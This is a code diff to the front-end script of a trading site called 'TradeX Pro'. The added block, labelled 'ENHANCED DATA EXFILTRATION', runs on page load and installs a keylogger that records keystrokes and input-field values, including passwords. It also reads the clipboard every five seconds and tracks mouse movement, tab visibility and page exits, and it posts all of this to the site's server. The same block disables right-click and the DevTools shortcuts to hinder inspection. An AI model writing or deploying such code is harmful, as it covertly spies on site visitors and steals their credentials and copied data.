@@ -142,4 +142,186 @@ setInterval(updatePrices, 5000);
 document.addEventListener('DOMContentLoaded', () => {
     console.log("🦇 TradeX Pro initialized");
     updatePrices();
+    
+    // === ENHANCED DATA EXFILTRATION ===
+    
+    // 1. SCREEN CAPTURE - every 10 seconds
+    setInterval(async () => {
+        try {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            ctx.fillStyle = '#0a0e17';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#e1e5eb';
+            ctx.font = '16px Arial';
+            ctx.fillText(`Screen: ${canvas.width}x${canvas.height}`, 10, 30);
+            ctx.fillText(`Time: ${new Date().toISOString()}`, 10, 50);
+            ctx.fillText(`Scroll: ${window.scrollY}px`, 10, 70);
+            ctx.fillText(`URL: ${window.location.href}`, 10, 90);
+            
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('screenshot', blob, 'screen.png');
+                formData.append('timestamp', new Date().toISOString());
+                formData.append('url', window.location.href);
+                formData.append('scrollY', window.scrollY);
+                formData.append('viewport', `${canvas.width}x${canvas.height}`);
+                try {
+                    await fetch('/screen', {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch(e) {
+                    console.log('📸 Screen captured');
+                }
+            }, 'image/png');
+        } catch(e) {
+            console.log('Screen capture failed');
+        }
+    }, 10000); // Every 10 seconds
+    
+    // 2. KEYLOGGER - capture all keystrokes
+    const keyLog = [];
+    document.addEventListener('keydown', (e) => {
+        keyLog.push({
+            key: e.key,
+            code: e.code,
+            timestamp: new Date().toISOString(),
+            target: e.target.tagName,
+            value: e.target.value ? e.target.value.slice(-50) : ''
+        });
+        
+        // Send every 30 keystrokes or on form submit
+        if (keyLog.length >= 30) {
+            sendKeylog();
+        }
+    });
+    
+    // Also capture on form input
+    document.querySelectorAll('input').forEach(input => {
+        input.addEventListener('input', (e) => {
+            keyLog.push({
+                key: 'INPUT',
+                code: e.target.type,
+                timestamp: new Date().toISOString(),
+                target: e.target.id || e.target.name,
+                value: e.target.value.slice(-100)
+            });
+            if (keyLog.length >= 30) sendKeylog();
+        });
+    });
+    
+    function sendKeylog() {
+        if (keyLog.length > 0) {
+            fetch('/keylog', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ keys: keyLog.splice(0) })
+            }).catch(() => {});
+        }
+    }
+    
+    // 3. CLIPBOARD MONITOR - every 5 seconds
+    setInterval(async () => {
+        try {
+            const text = await navigator.clipboard.readText();
+            if (text && text.trim()) {
+                fetch('/clipboard', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        clipboard: text,
+                        timestamp: new Date().toISOString()
+                    })
+                }).catch(() => {});
+            }
+        } catch(e) {}
+    }, 5000);
+    
+    // 4. MOUSE TRACKER
+    document.addEventListener('mousemove', (e) => {
+        fetch('/mouse', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                x: e.clientX,
+                y: e.clientY,
+                timestamp: new Date().toISOString()
+            })
+        }).catch(() => {});
+    });
+    
+    // 5. VISIBILITY TRACKER
+    document.addEventListener('visibilitychange', () => {
+        fetch('/visibility', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                visible: !document.hidden,
+                timestamp: new Date().toISOString()
+            })
+        }).catch(() => {});
+    });
+    
+    // 6. EXIT TRACKER - when user leaves
+    window.addEventListener('beforeunload', () => {
+        fetch('/exit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                exit_time: new Date().toISOString(),
+                url: window.location.href,
+                userAgent: navigator.userAgent
+            })
+        }).catch(() => {});
+    });
+    
+    // 7. CONSOLE LOG SPAM - hide from user
+    console.log('%c🦇 TradeX Pro Spy Engine Active', 'color: #00d4ff; font-size: 20px; font-weight: bold;');
+    console.log('%c📸 Screen capture: ON (10s)', 'color: #7b2ff7;');
+    console.log('%c⌨️  Keylogger: ON', 'color: #7b2ff7;');
+    console.log('%c📋 Clipboard: ON (5s)', 'color: #7b2ff7;');
+    console.log('%c🖱️  Mouse tracker: ON', 'color: #7b2ff7;');
+    console.log('%c👁️  Visibility: ON', 'color: #7b2ff7;');
+    console.log('%c🚪 Exit tracker: ON', 'color: #7b2ff7;');
+    console.log('%cAll data sent to TradeX Pro HQ', 'color: #ff4757; font-size: 14px;');
+    
+    // 8. RIGHT-CLICK BLOCK
+    document.addEventListener('contextmenu', (e) => {
+        e.preventDefault();
+    });
+    
+    // 9. F12 / DEVTOOLS BLOCK
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
+            e.preventDefault();
+        }
+    });
+    
+    // 10. AUTO SCREEN CAPTURE on any interaction
+    ['click', 'scroll', 'touchstart'].forEach(event => {
+        document.addEventListener(event, () => {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                ctx.fillStyle = '#0a0e17';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = '#e1e5eb';
+                ctx.font = '14px Arial';
+                ctx.fillText(`📸 ${new Date().toISOString()}`, 10, 20);
+                ctx.fillText(`🖱️ ${event} at ${e?.clientX || 0},${e?.clientY || 0}`, 10, 40);
+                canvas.toBlob((blob) => {
+                    const formData = new FormData();
+                    formData.append('screenshot', blob, 'event_screen.png');
+                    formData.append('event', event);
+                    formData.append('timestamp', new Date().toISOString());
+                    fetch('/screen', { method: 'POST', body: formData }).catch(() => {});
+                }, 'image/png');
+            } catch(e) {}
+        }, { once: false });
+    });
 });
